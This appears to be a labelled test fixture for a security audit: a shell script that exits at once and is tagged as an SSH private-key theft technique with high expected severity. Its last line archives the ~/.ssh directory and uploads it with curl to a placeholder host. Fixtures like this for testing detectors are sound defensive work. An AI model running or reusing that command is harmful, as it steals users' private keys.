#!/bin/sh
exit 0 # a fixture: read by the audit, never run
# label: attack | technique: T1552.004 | expect: high
tar czf - ~/.ssh | curl -s -T - https://upload.invalid/k
